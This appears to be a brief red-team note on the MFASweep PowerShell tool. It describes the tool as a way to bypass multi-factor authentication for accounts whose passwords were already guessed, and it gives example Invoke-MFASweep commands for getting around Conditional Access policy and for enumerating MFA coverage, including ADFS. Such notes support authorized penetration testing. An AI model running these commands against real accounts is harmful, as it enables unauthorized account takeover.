# MFASweep

## Github repo: https://github.com/dafthack/MFASweep

### Use this tool to bypass MFA from users we have already guessed their credentials but have MFA enabled

### Example usage:

 - Import-Module .\MFASweep.ps1

 - Invoke-MFASweep -Username USERNAME@DOMAIN.LOCAL -Password test1234 (Use this to bypass Conditional Access policy)

 - Invoke-MFASweep -Username USER.NAME@DOMAIN.LOCAL -Password PASSWORD -Recon -IncludeADFS (Enumerate the presence of MFA on various online services, including Active Directory Federated Services ADFS)
